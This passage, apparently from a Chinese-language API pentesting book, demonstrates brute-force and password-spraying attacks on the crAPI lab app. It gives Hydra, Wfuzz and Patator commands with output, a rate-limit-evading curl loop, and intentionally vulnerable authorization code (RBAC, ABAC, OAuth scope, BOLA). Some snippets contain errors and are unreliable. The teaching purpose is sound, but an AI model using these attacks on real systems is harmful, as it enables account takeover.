同样的事情也可能发生在 API 上。有时，开发者忘记删除仅用于测试的凭证对，有时凭证是硬编码在代码中的，而这些代码存储在公开的代码库中，还有时这些凭证被赋予了强大的权限，这是 API 中最糟糕的情况。其他情况下，默认账户可能并不存在，但凭证无论是有意的还是无意的——是的，有时可能带有恶意意图——它们的安全性较差。简单和/或短的密码、糟糕实现的伪随机数生成器、小的种子和盐值、脆弱的哈希算法和加密算法，都是弱凭证创建和传播的示例。

## 暴力攻击

这是任何关于应用程序凭证讨论中可能会首先出现的话题。如果你在 Google 上搜索类似于 *最常用的密码* 或 *常见密码*，或者这些词汇的组合，你会对搜索结果的数量感到惊讶。在本章的 *进一步阅读* 部分，你会找到一些密码目录的列表，其中有些目录的大小达到吉字节，可以用来进行测试。

在 API 渗透测试的上下文中，暴力破解攻击针对的是需要凭证进行访问的 AuthN 端点。你可以使用专门的工具来自动化这个过程，这些工具可以简化暴力破解过程，允许你指定用户名和密码列表、目标端点，并定义攻击参数。一些非常有用的工具包括 hashcat、Medusa 和 Hydra。让我们先尝试使用 Hydra 对 crAPI 进行攻击。但在此之前，我们需要了解 crAPI 如何处理 AuthN 尝试。可以使用 Burp Suite、ZAP，或者你的浏览器的开发者工具，打开登录页面并输入任何电子邮件地址和密码。crAPI 会显然拒绝你的尝试，但重要的是请求是如何发送的。你将会发现类似以下内容：

```
POST /identity/api/auth/login HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/login
Content-Type: application/json
Content-Length: 49
Origin: http://localhost:8888
Connection: close
{"email":"blabla@domain.com","password":"nonono"}
```

在使用 Hydra 时，我们需要遵守其中的多个字段，以便 crAPI 的后台能够正确处理我们的尝试。应用程序期望输入为 JSON 格式。同样，错误输出也会是 JSON 格式：

```
...
Content-Type: application/json
{"token":null,"type":"Bearer","message":"Given Email is not registered! "}
...
```

现在，尝试使用有效的凭证对进行测试，并观察相应的响应。答案是 JWT 及其他参数：

```
...
Content-Type: application/json
...
{"token":"eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiJtYXVyaWNpb0Bkb21haW4uY29tIiw icm9sZSI6InVzZXIiLCJpYXQiOjE3MDc2NTkzODIsImV4cCI6MTcwODI2NDE4Mn0.X57Sg 1JDwDV1Zs7vyEcO_tJCcemXCHMV27ttJe-nuoF2hYpxRRAwYiM9BkKNDpWmfBSu4YtQTIa DjI9ueyC3xQM_g_w3Z6i3RxxMhZoEVf5psujkbmJi2DaznLiEISsVXashO30SOQKNFuCx v_1K8QtReRkGV7EzZcLrucEnM56vMfz6-Z0Kd5ND4YXBNDsj5CjdnehuxtjVrCf-q33a3J W9jwoqJPiFRoMVlbnX3wv3VHjU0768tpYwdon80th7Je34JgtLafbHDb9m8aSsnvdnnO7O LWOBtJC65HD14jdanY0GPt9ltqA9_-d2f6zk1jIOSJO-3emQqaXM6lMSAQ","type":"Bearer","message":null}
```

现在，选择所有作为成功登录活动一部分发送的请求参数。你几乎需要所有这些参数来构建命令。不管你使用了什么工具来捕获请求，你都会得到以下参数：

```
POST /identity/api/auth/login HTTP/1.1
Host: localhost:8888
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8888/login
Content-Type: application/json
Content-Length: 53
Origin: http://localhost:8888
Connection: close
{"email":"<your username>","password":"<your password>"}
```

Hydra 会并行化暴力破解尝试，以优化你的搜索。假设 `admin` 是一个可能的用户名（Hydra 会根据你选择的动词类型将 `http` 替换为 `http-get` 或 `http-post`），并使用一个包含密码的文本文件（`passlist.txt`），执行以下命令：

```
$ hydra -l admin -v -P passlist.txt -s 8888 localhost http-post "/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=\"token\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\://localhost\:8888/login:H =Content-Type: application/json:H=Origin: http\://localhost\:8888:H=Connection: close"
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-02-07 03:09:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 50915 login tries (l:1/p:50915), ~3183 tries per task
[DATA] attacking http-post://localhost:8888/identity/api/auth/login
[STATUS] 9112.00 tries/min, 9112 tries in 00:01h, 41803 to do in 00:05h, 16 active
[STATUS] 9234.00 tries/min, 27702 tries in 00:03h, 23213 to do in 00:03h, 16 active
1 of 1 target completed, 0 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-02-07 03:14:31
```

让我们首先解释一些参数：

+   `-l`：要求你提供唯一的用户名以进行测试。

+   `-v`/`-V`：启用详细模式。

+   `-P`：要求提供一个密码列表文件。

+   `-s`：如果目标没有使用默认端口（`80` 或 `443`），你需要指定端口。

+   `http-post`：需要使用的 Hydra 模块。

双引号中的所有内容要么是标题的一部分，要么是请求体的一部分。`"/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}"` 部分包括了 API 端点以及 crAPI 期望接收的 JSON 结构。在这里，`^USER^` 会被你通过 `-l` 提供的登录名替换，而 `^PASS^` 会被 `passlist.txt` 文件中的密码逐一替换。接着，我们指定了在登录成功时期望接收到的内容（`S` 键）。如我们所见，当成功登录时，我们能够访问大量数据，包括一个 `token` 字样，后跟相应的 JWT。所有以 `H=` 开头的元素都是头部的一部分。此外，请注意反斜杠字符（`\`）。它用于转义紧随其后的字符，以便 Hydra 能够正确处理，而不是将其误认为请求的结束引号或分号分隔符。

到目前为止，我们什么也没有找到。让我们改用一个包含多个用户名的登录文件来尝试。这个文件包含如 `admin`、`administrator`、`Administrator`、`admin123` 和 `4dm1n` 这样的行。当然，文件中行数越多，任务就会越长。最好在进行其他操作时让它继续运行。Hydra 还允许你指定希望同时运行的线程数。以下命令可以写成一行：

```
$ hydra -l login.txt -v -P passlist.txt -s 8888 localhost http-post "/identity/api/auth/login:{\"email\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:S=\"token\":H=Accept: */*:H=Accept-Language: en-US,en;q=0.5:H=Accept-Encoding: gzip, deflate, br:H=Referer: http\://localhost\:8888/login:H=Content-Type: application/json:H=Origin: http\://localhost\:8888:H=Connection: close"
```

观察并行线程（默认 16 个）正在执行攻击：

```
$ ps a | grep hydra
  15897 pts/0    S+     0:08 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
  15919 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
...
  15933 pts/0    S+     0:03 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
  15934 pts/0    S+     0:02 hydra -L login.txt -P passlist.txt http-post://localhost:8888/identity/api/auth/login
```

该工具成功找到了一个有效的用户名/密码组合：

```
[8888][http-post-form] host: localhost   login: admin@example.com   password: Admin!123
```

请记住，像 Hydra 使用的方法可能会被 API 后端本身检测到，或者更容易被其他保护层，如 WAF，检测到。该工具会生成成千上万甚至百万次请求发送到目标端点，这些请求可能会被启用了速率限制保护的 API 端点进行衡量和阻止。让我们检查一下，举个例子，crAPI 日志条目是如何显示的：

```
$ docker logs -f crapi-web
admin [07/Feb/2024:02:28:02 +0000] "POST /identity/api/auth/login HTTP/1.1" 400 0 "-" "Mozilla/4.0 (Hydra)"
```

为了规避这一点，你应该从不同的 IP 地址运行多个 Hydra 实例。可以启动多个容器，最好使用独立的网络段，或者创建一个具有伪造 IP 地址的受控环境。当然，切记不要在互联网上伪造有效的 IP 地址。我们是安全专家，不是罪犯。

其他有效的暴力破解工具包括 Medusa 和 ncracker。然而，在我为撰写本章所做的测试中，它们并不如 Hydra 成功，或者它们的性能没有 Hydra 好。运行这些类型的攻击时，千万不要忘记使用字典文件。将它们结合使用、混合搭配是接近某些 API 端点凭证的有效方式。

有一个非常有趣的工具叫做**常见用户密码分析器**（**CUPP**；[`github.com/Mebus/cupp`](https://github.com/Mebus/cupp)）。它可以帮助你从互联网上下载大型密码列表。它还有一个交互模式，会根据你回答的问题来生成针对目标/受害者的密码列表。一个优点是，这段 Python 代码不需要任何第三方模块，下载后你就可以直接使用。我们来对 crAPI 进行测试。我们将从 AlectoDB 下载默认的用户名和密码（目前已合并至[`github.com/yangbh/Hammer/tree/master/lib/cupp`](https://github.com/yangbh/Hammer/tree/master/lib/cupp)）。克隆 CUPP 的仓库，并输入以下命令：

```
$ python cupp.py -a  ___________    cupp.py!                 # Common       \                     # User        \   ,__,             # Passwords         \  (oo)____         # Profiler            (__)    )\                 ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]                            [ Mebus | https://github.com/Mebus/]
[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/... ... 

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt [+] Done.
```

你刚刚获得了包含用户名和密码的两个文本文件。你将在*第六章*《错误处理与异常测试》中了解更多相关内容，但还有一个名为`Wfuzz`的工具（[`github.com/xmendez/wfuzz`](https://github.com/xmendez/wfuzz)），你可以通过多种方式安装它，帮助进行利用密码列表进行暴力破解攻击。我通过`pip`安装了它，并使用刚下载的用户名和密码对 crAPI 进行了测试。以下是结果：

```
$ wfuzz -z file,alectodb-usernames.txt -z file,alectodb-passwords.txt \
  -X POST -H "Content-Type: application/json" \
  -d '{"email":"FUZZ","password":"FUZ2Z"}' \
  http://localhost:8888/identity/api/auth/login
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************
Target: http://localhost:8888/identity/api/auth/login
Total requests: 915096
=====================================================================ID           Response   Lines    Word       Chars       Payload                                                                                                              =====================================================================
000000001:   400        0 L      118 W      1520 Ch     "123456"                                                                      000000042:   400        0 L      61 W       797 Ch      "2222"                                                                                                               000000041:   400        0 L      61 W       797 Ch      "21241036"                                                                                                           000000015:   400        0 L      61 W       797 Ch      "(unknown)"                                                                                                          000000003:   400        0 L      61 W       797 Ch      "!manage"                                                                                                            000000043:   400        0 L      61 W       797 Ch      "22222"
…Output omitted for brevity…
Total time: 0
Processed Requests: 1105854
Filtered Requests: 0
Requests/sec.: 0
```

观察`ID`列中的请求编号。它们并不是按顺序排列的。原因是`Wfuzz`将它们组织在不同的线程中，这样可以一次发送多个请求。我们这次没有找到匹配的结果，但这并不影响工具的有效性。你可以将它与其他词典结合使用。`Wfuzz`非常方便，因为它会尝试多种用户名和密码组合，并显示所有成功的尝试。当然，如果你已经知道用户名或密码之一，这将大大减少程序的工作量。关于链接列表的参考，可以在章节末尾找到。

## 常见凭据和默认账户

你可以利用在上一章中获得的知识，例如 OSINT 技巧和其他枚举方法，来获得一些默认的 API 凭据。API 文档本身是默认凭据的有效来源。在你的渗透测试工作中，你可能会发现一个利用市场 API 提供商后端的网站。一些提供商的产品有默认凭据，包括管理员凭据。因此，借助检查文档或其他主动或被动方法，你可能会发现一对凭据。

使用与前一小节相同的方法，首先在 Google 上搜索*默认密码*或*常见密码*。在本章末尾可以找到 2024 年生成的密码列表。一些系统管理员仍然使用默认的管理员用户名，如`admin`或`administrator`来运行他们的 API 后台。即使是运行流行的`admin`或`administrator`网站，它们也可能是超级用户的用户名。其本地化版本，如`administrador`，也是有效的。

当然，你也可以使用 Hydra、Medusa 或 Burp Suite 的`repeater`或`intruder`功能，甚至通过网页浏览器来做这件事，但你也可以通过编写一个简单的循环脚本来自动化你的工作，比如以下这个：

```
#!/bin/bash
passwords="wordlist.txt"
MAXWAIT=2
while IFS= read -r line
do
  curl -X POST --data "username=admin&password=$line >> output.txt
  sleep $((RANDOM % MAXWAIT))
done < passwords
```

在前面的代码中，`wordlist`文件名被放入`$passwords`变量中。然后，我将`$MAXWAIT`变量设置为`2`。在`while`循环内，我执行了`curl`命令，并将其输出附加到`output.txt`文件中。然后，我让代码休眠一个介于 0 到 2 秒之间的随机数。`$RANDOM`变量是 Bash 内置的，返回一个介于 0 到 32,767 之间的随机整数。该整数然后被`$MAXWAIT`除，余数就是脚本休眠的秒数。这只是为了避免被某些 API 的速率限制控制限制。脚本在`while`循环结束时读取`wordlist.txt`文件并逐行处理。

做相反的操作也是有效的，这是一种叫做**密码喷洒**的技术。它的工作原理是针对多个用户账户测试一个单一密码或一小组密码。它对于那些为所有用户生成相同初始密码并建议用户在第一次登录后更改密码的应用程序非常有用。单纯依赖人类因素并不完全符合安全最佳实践。要进行密码喷洒，可以使用一些工具，如 CrackMapExec、Patator 和 Metasploit（它是一个包含众多插件的工具）。让我们考虑使用 Patator 来完成这个任务。

如果你在安装了本章提到的实验环境后跟随本章，那么在 Ubuntu 上运行 Patator 就像执行`sudo apt-get update`；`sudo apt-get install patator`一样简单。只需注意，这个包有很多依赖项。当我编写本章时，软件及其依赖项大约占用 300MB 的磁盘空间。

在深入挖掘并发现版本 0.9 的 Patator（用于编写本章的版本）似乎无法正确处理 HTTP 请求头后，我最终得到了以下结果：

```
$ patator http_fuzz method=POST resolve=domain:127.0.0.1 url=http://localhost:8888/identity/api/auth/login auto_urlencode=0 body='{"email": "FILE0", "password": "Admin!123"}' 0=./userlist.txt header=@fuzzerheader.txt
patator INFO - Starting Patator 0.9 (https://github.com/lanjelot/patator) with python-3.10.12 at 2024-02-18 18:40 -03
patator INFO -
patator INFO - code size:clen   time | candidate           |   num | mesg
patator INFO - ----------------------------------------------------------
patator INFO - 500  595:74     0.163 | user@domain.com     |     5 | HTTP/1.1 500
patator INFO - 500  595:74     0.252 | user@example.com    |     6 | HTTP/1.1 500
patator INFO - 500  595:74     0.451 | admin@domain.com    |     1 | HTTP/1.1 500
patator INFO - 200  1031:509   0.442 | admin@example.com   |     2 | HTTP/1.1 200
patator INFO - 500  595:74     0.359 | dummy@domain.com    |     3 | HTTP/1.1 500
patator INFO - 500  595:74     0.366 | dummy@example.com   |     4 | HTTP/1.1 500
patator INFO - Hits/Done/Skip/Fail/Size: 6/6/0/0/6, Avg: 5 r/s, Time: 0h 0m 1s
```

仅为了保持一致性，前面的命令是单行输入的。现在，让我解释一下所有不太直观的参数：

+   `http_fuzz`：Patator 有很多模块，这是用于处理 HTTP 目标的模块。由于我们尝试对 crAPI（一个 HTTP REST API 实现）进行身份验证，它是最佳选择。

+   `method=POST`：我们需要告诉 `http_fuzz` 使用哪种 HTTP 方法。为了进行身份验证，crAPI 期望请求使用 POST 方法发送。

+   `resolve=domain:127.0.0.1`：需要添加这个参数，因为 Patator 在处理 URL 时有些困惑。由于我的 crAPI 实现运行在本地主机上，我只是告诉 Patator 在解析主机名时，将其视为 `127.0.0.1`。我知道这看起来不合逻辑，但这是我找到的让 Patator 与本地主机 URL 配合工作的方式。

+   `autourl_encode=0`：指示 Patator 在发送请求之前对所有请求体中的字符进行编码。这在处理非字母数字字符时非常有用，比如接下来会解释的 JSON 结构中使用的字符。

+   `body='{"email": "FILE0", "password": "Admin!123"}'`：这是表示登录的 JSON 结构。我使用了默认的 crAPI 管理员密码来演示当工具成功时的情况。`FILE0` 表示邮箱地址会被后面指定的文件中的行替换。

+   `0=./userlist.txt`：这对应之前的 `FILE0` 项。`userlist.txt` 文件包含了所有用户名，每行一个，作为登录凭据。

+   `header=@fuzzerheader.txt`：`fuzzerheader.txt` 文件包含了 crAPI 登录请求所需的头信息。这个内容会根据目标 API 端点的实现而有所不同，正如我们之前讨论过的，首先你需要枚举该端点，了解其细节。

`userlist.txt` 文件内容如下：

```
admin@domain.com
admin@example.com
dummy@domain.com
dummy@example.com
user@domain.com
user@example.com
```

`fuzzerheader.txt` 文件包含如下内容：

```
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8888/login
Content-Type: application/json
Origin: http://localhost:8888
Connection: close
```

观察之前执行的 Patator 命令的列状输出。每一行对应用户名和密码的一个组合。在这个例子中，只考虑了一个密码，但你也可以使用另一个文本文件（如字典文件）来提供给工具。在 `code` 部分，你可以看到作为响应发送的 HTTP 代码。`size:clen` 列显示了响应中接收到的字符数：分别是总大小和内容长度。后者才是我们关心的。时间一目了然。`Candidate` 假设每一个用户名和密码组合。如果我们尝试多个密码，行内容会是类似 `username:password` 的形式。`Num` 对应组合的编号。观察到 Patator 并不一定按 `userlist.txt` 文件中的顺序执行。虽然 `admin@domain.com` 在第一行，但它出现在第三行的输出中。最后再次显示的是带有代码的消息。

我们在寻找 200 响应码，这表示尝试是成功的。在我们的案例中，它发生在第四行输出中，其中 `size` 相比其他行大得多。然而，仅仅通过大小差异并不能说明任何问题。你应该关注所有带有 `200 响应` 码的行。请注意，也可能会出现假阳性。因此，将所有看似成功的用户名和密码分开，进一步调查。

在下一节中，我们将介绍 API 的 AuthZ 机制。

# 探索授权机制

所以，我们已经玩过了 AuthN 部分，但这只是整个过程的一部分。在获得系统访问权限后，我们需要拥有足够的权限去做一些普通用户无法做到的事情。然而，值得提到的是，即使是普通用户，也可能根据 API 的 AuthZ 控制实施方式，具有只读权限访问敏感数据或其他用户的数据。

在 API 渗透测试过程中，探索 AuthZ 机制对于识别潜在的安全漏洞并确保只有授权用户或客户端能够访问受保护的资源至关重要。AuthZ 机制定义了管理访问 API 端点、数据和功能的规则和策略，测试这些机制有助于评估其在执行访问控制和防止未授权访问方面的有效性。在进一步探讨如何探索 API 的 AuthZ 机制之前，我们需要了解它们是什么。AuthZ 机制是指定一旦用户认证后，用户可以做什么和不能做什么的控制方式。截止到目前，最常用的方法如下：

+   **基于角色的访问控制 (RBAC)**：系统中的每个有效用户都会被分配一个或多个角色，这些角色决定了哪些操作是被允许的。根据系统的设计，某些操作也可能会被明确拒绝。一旦检测到这样的机制，你可以尝试发现存在哪些角色，并设计绕过/使控制失效的方法。一个现实的例子是，一家公司中属于人力资源部门（角色）的员工将能访问工资单数据，而其他员工（当然不包括董事会成员）则无法访问。

+   **基于属性的访问控制（ABAC）**：结合分配给用户、他们试图访问的资源以及资源所在的物理或逻辑环境的参数或属性。这是通常由公共云服务提供商应用的一种控制方式，这些属性通常被称为“标签”或“标记”（不要与智能令牌或标签混淆）。它们由键值对组成，云系统管理员可以将其分配给不同的用户和资源，以更好地对资产进行分组。权限可以根据这些标签来设置。您可以尝试操纵或注入属性以获得未经授权的访问。一个现实世界的例子是在机构提供服务的承包商。一旦他们穿着公司提供的制服（标签），他们就被授予进入被分配给其承包公司的区域的权限。然而，每个承包商只能访问为其被聘用的公司指定的区域。当另一位为同一家公司工作的承包商最终被添加或取代之前的承包商时，新的承包商必须获得类似的制服。通过穿着另一位承包商的制服，您可能进入他们公司的区域，可能不会被注意到。

+   **OAuth 范围**：我们已经讨论了 OAuth 及其为 API 提供的功能。在这种情况下，范围定义用户被授权请求的具体访问级别或资源。一个现实世界的例子可能是军事设施，各级军官将共同工作。然而，上尉收到的信息的上下文要高于中尉的，后者高于上尉的，依此类推。冒充军官（绕过上下文）将使您能够访问受限/特权信息。

让我们更详细地看看每一个。

## 基于角色的访问控制

假设您正在测试和尝试探索的系统应用了这种机制。crAPI 是这样的，对吧？还记得我们曾伪造令牌，假装拥有`ROLE_ADMIN`角色而不是`ROLE_USER`吗？

在 API 安全领域，RBAC 在保护对敏感数据和功能的访问中发挥着关键作用。这种方法基于为用户或群组分配的预定义角色授予权限，确保个体仅具备其指定任务所需的访问级别。

RBAC 操作基于三个核心组件：

+   `admin`、`editor`、`reader`或`guest`。

+   **用户**：与 API 交互的个体实体，通常通过用户名、ID 或其他唯一标识符进行识别。

+   **权限**：用户可以对 API 资源执行的粒度操作，如**创建、读取、更新或删除**（CRUD）。

用户首先通过 API 进行身份验证，提供诸如用户名、密码或令牌等凭据。根据验证过的用户，系统确定其分配的角色。当用户请求访问特定的 API 资源时，系统会验证其相关角色是否具有所请求操作所需的权限。如果用户的角色具有所需权限，则授予访问权限；否则，拒绝访问，并返回相应的错误消息。

RBAC 的一些优点如下：

+   **细粒度访问控制**：通过根据特定角色定制权限，实现对 API 访问的精细控制。

+   **减少复杂性**：通过将相似的权限归类到角色中，简化访问管理。

+   **增强的安全性**：通过基于用户角色限制操作，最小化未经授权访问的风险。

使用 RBAC 的公共 API 示例包括云存储 API，其中授予特定文件夹或文件的读/写访问权限是基于用户角色的；社交媒体 API，允许用户根据其账户类型（管理员、版主或普通用户）发布、编辑或删除内容；以及电子商务 API，基于用户角色（客户、供应商或管理员）控制对产品信息、订单管理和定价数据的访问。

## 基于属性的访问控制

ABAC 深入探讨了访问控制的工作方式。它不仅仅依赖于角色及其权限，而是提供了一种更加细致和灵活的方法，特别适用于复杂的 API 环境。例如，医疗 API 根据用户角色、数据敏感度等级和访问位置来控制对敏感病人数据的访问。金融 API 基于用户身份、账户类型、交易金额和时间来授予财务交易的授权。物联网（IoT）API 基于设备类型、位置以及与设备相关的特定权限来启用安全的设备访问和数据交换。

除了仅仅依赖预定义的、有时是自定义的角色外，ABAC 还会评估与访问请求中不同实体相关的各种属性：

+   **主体**：请求访问的用户或实体（例如，用户名、IP 地址或设备类型）。

+   **资源**：被访问的 API 资源（例如，数据对象或端点 URL）。

+   **操作**：正在尝试的操作（例如，读取、写入或删除）。

+   **环境**：上下文因素，如时间、位置或特定条件（例如，紧急访问）。

+   **属性**：与任何前述实体相关的额外数据点（例如，用户部门、资源敏感度等级或时间）。

当用户与 API 进行交互时，系统会收集所有相关实体的属性。之后，系统会根据收集到的属性评估预定义的访问控制策略。这些策略定义了在特定条件下，某些操作是否被允许或拒绝。最后，根据策略评估结果，系统将决定是否授予访问权限。

应用 ABAC 的一些好处包括细粒度和灵活的控制，通过考虑除角色之外的各种属性，实现高度细化的访问控制；动态和可调整的策略，可以根据属性变化动态调整，适用于复杂和不断变化的环境；以及减少配置错误，通过关注特定属性和条件，降低角色配置错误的风险。

例如，**Amazon Web Services**（**AWS**）为其资源组标签提供了特定的 API，允许客户或合作伙伴通过创建、附加、更新或删除标签与其云资源进行交互。然后，这些标签可以进一步与 AWS IAM 策略进行检查，以符合云访问控制策略。

## OAuth 范围

OAuth 范围在某些方面类似于 ABAC 支持的 API 中的属性，因为它们也应用标签。它们作为定义应用程序可以请求的特定权限的机制，进而决定它在 API 资源上的访问级别。OAuth 范围本质上是表示与 API 相关的一组特定权限的字符串。当应用程序使用 OAuth 请求 API 访问时，它会在其 AuthZ 请求中指定所需的范围。然后，AuthZ 服务器会根据应用程序注册的权限评估这些请求的范围，并授予相应访问级别的访问令牌。

从中我们可以得出至少以下几种利用 OAuth 范围进行 API 访问的直接好处：

+   **细粒度控制**：通过允许应用程序仅请求其所需的特定权限，实现对 API 访问的精确控制。

+   **减少风险**：通过限制应用程序访问令牌的范围，降低未经授权访问的风险。

+   **提高透明度**：为每个应用程序提供清晰的权限可见性，从而增强问责制和信任。

可以在 API 上创建许多不同的范围来满足特定需求。API 可以利用的某些范围类型包括 **只读**（允许应用程序从特定 API 资源中读取数据，但不能修改或删除数据）、**只写**（授予应用程序创建或更新 API 中数据的能力，但不能读取现有信息）、**完全访问**（提供对所有 API 资源的全面访问，包括读取、写入和删除权限）、**用户特定**（根据与应用程序关联的用户定义权限，从而在特定用户上下文中进行精细控制）和 **资源特定**（限制对 API 中特定资源的访问，允许应用程序仅访问所需的数据）。

以下 Python 代码块展示了处理 API 上 OAuth 范围的一些示例：

```
import requests
# providing the scope as part of the HTTP GET request
auth_url = "https://api.example.com/oauth/authorize"
params = {
  "client_id": "your_client_id",
  "redirect_uri": "your_redirect_uri",
  "response_type": "code",
  "scope": "read-write"
}
response = requests.get(auth_url, params=params)
# A JWT carrying the granted scope
token = {
  "access_token": "your_access_token",
  "expires_in": 3600,
  "scope": "read"
}
# How you could check the scopes in a request
headers = {
  "Authorization": f"Bearer {your_access_token}"
}
response = requests.get("https://api.example.com/resource",                          headers=headers)
# Check if at least read access was granted
if "read" in response.json().get("scopes", []):
  # Access granted
else:
  # Access denied due to insufficient scope
# Creating scopes with Flask
from flask import Flask
from flask_oauthlib.provider import OAuth1Provider
app = Flask(__name__)
scopes = {
  "read": "Read access to all resources",
  "write": "Write access to all resources",
  "user:read": "Read access to user data",
  "user:write": "Write access to user data"
}
@app.route("/api/protected")
@requires_oauth("read")
def protected_resource():
  # Access granted for users with the "read"
```

代码的最后部分展示了利用 Flask OAuth 库的简便方法。Flask 是一个使构建 Python 后端应用程序更容易的框架。

一些广为人知的使用 OAuth 范围的 API 包括 Google Drive、GitHub、X（前身为 Twitter）、Dropbox 和 Facebook/Meta。

接下来，让我们学习如何绕过访问控制。

# 绕过访问控制

为了成功绕过访问控制，你必须要么探索 API 中的配置错误或缺失的配置，要么发现一些后端逻辑缺陷。所有提到的 AuthZ 机制都很强大，但它们在 API 端点上的实现方式可能使它们变得无效，或至少对某些尝试存在漏洞。

为了说明这一点，让我们提出三个不同的场景，分别有 RBAC、ABAC 和 OAuth 范围的设置。我们来了解一些攻击是如何进行的。对于 RBAC，假设你有一个管理员工数据的 API，具有不同的角色，如 `employee` 和 `admin`。`admin` 角色可以访问所有员工记录，而 `employee` 角色只能访问自己的记录。然而，API 在某些操作过程中没有正确验证用户的角色。换句话说，以下是这种情况：

+   作为一名员工，你应该仅能访问自己的数据。然而，你注意到在更新个人信息时，API 并未检查你的角色。

+   通过修改 API 请求以模拟管理员用户，你可以访问并修改任何员工的数据，从而绕过预定的 RBAC 控制。

这里展示了一段易受攻击的 Python 代码片段。请观察其逻辑：

```
# This function updates employee information.
def update_employee_info(employee_id, new_info, user_role):
    if user_role == "admin":  # Incorrectly assuming user_role is trusted
        # Update employee info in the database
        ...
        return "Information updated successfully"
    else:
        return "Access denied. No permission to perform this operation."
# API endpoint to update employee information
@app.route('/employees/<employee_id>', methods=['PUT'])
def update_employee(employee_id):
    new_info = request.json
    user_role = get_user_role(request.headers['Authorization'])  # Function to get user role
    return update_employee_info(employee_id, new_info, user_role)
```

该代码仅从请求头中获取请求者提供的角色，而未进一步检查该声明是否合法。因此，在这种情况下，一旦你提交一个 `user_role` 为 `admin` 的请求，你就会获得 API 的全部权限。

现在，转到 ABAC，考虑一个在线银行应用的 API，其中财务交易的访问是基于用户账户类型（如标准账户或高级账户）和交易金额来控制的。然而，由于属性验证逻辑中的缺陷，攻击者可以操控交易金额属性来执行高价值交易。

观察一个用 Python 编写的易受攻击的代码示例来表示这一点：

```
# Function to process financial transactions
def process_transaction(account_type, transaction_amount):
    if account_type == "standard" and transaction_amount > 1000:
        return "Access denied! Transaction amount above limit."
    else:
        # Process the transaction
        ...
        return "Transaction processed successfully"
# API endpoint to initiate a financial transaction
@app.route('/transactions', methods=['POST'])
def initiate_transaction():
    transaction_data = request.json
    account_type = get_account_type(request.headers['Authorization'])
    return process_transaction(account_type, transaction_data['amount'])
```

在这个示例中，`initiate_transaction` 端点的目的是限制标准账户类型的高价值交易。然而，代码未能正确验证交易金额，导致攻击者能够操控金额并绕过 ABAC 控制。请注意，采用类似于 RBAC 的方式，验证代码仅仅依赖请求者声明的信息。在这种情况下，如果你发送任何与 `standard` 不同的账户类型，便能够处理该交易，无论其金额如何。

最后，让我们来看一种可能使 OAuth 范围易受攻击的方式。假设你有一个 API 提供访问用户个人信息的功能，并且有不同的范围，如 `read_profile` 和 `write_profile`。然而，由于 OAuth 服务器的错误配置，分配给用户的访问令牌包含了不应有的范围，从而允许未经授权访问敏感资源。

看看这个易受攻击的代码：

```
# Function to read user profile information
def read_profile(access_token):
    # Assuming access token scopes are trusted
    if "read_profile" in access_token.scopes:
        # Read user profile information
        ...
        return "User profile: {}".format(profile_info)
    else:
        return "Access denied. Insufficient scope."
# API endpoint to retrieve user profile
@app.route('/profile', methods=['GET'])
def get_profile():
    # Function to extract access token
    access_token = extract_access_token(request.headers['Authorization'])
    return read_profile(access_token)
```

在这个示例中，`get_profile` 端点本应限制只有具有 `read_profile` 范围的用户才能访问。然而，代码错误地假设访问令牌的范围是可信的，且没有进行适当的验证，这使得攻击者能够操控令牌并绕过 OAuth 范围限制。总之，如果在 AuthZ 令牌中发送了一个特权范围的声明，在这个后端代码的配合下，你将能够成功执行操作。还有两个我们不能忘记提及的话题，它们通常被简称为 BOLA 和 BFLA。

## 被破坏的对象级授权（BOLA）

这是一种安全漏洞，当一个 API 在有效地允许访问对象和资源之前没有正确地应用 AuthZ 验证时，便会出现这种情况。通常发生在一个 API 完全依赖用户输入（如对象 ID），而没有检查提供这些 ID 的用户是否真的有权限访问这些 ID 时。你可以通过操控输入来实现未经授权的数据访问。

为了举例说明，假设一个 API 端点根据用户 ID 检索用户详细信息。如果该端点没有检查经过身份验证的用户是否有权访问所需的 ID，渗透测试人员可以提供任何有效的用户 ID 来获取其他用户的数据。当受影响的 API（或其背后的应用程序）处理敏感数据时，比如财务或健康记录，这种情况可能非常危险。当 BOLA（Broken Object Level Authorization）出现在应用程序或 API 代码中时，您可以枚举对象 ID 并访问未经授权的数据。观察下面的 Python 代码，它存在 BOLA 漏洞：

```
from flask import Flask, request, jsonify
app = Flask(__name__)
def get_user_by_id(user_id):    users = {        "1": {"id": 1, "name": "Alice", "role": "admin"},        "2": {"id": 2, "name": "Bob", "role": "user"},        "3": {"id": 3, "name": "Charlie", "role": "user"}    }    return users.get(user_id, None)
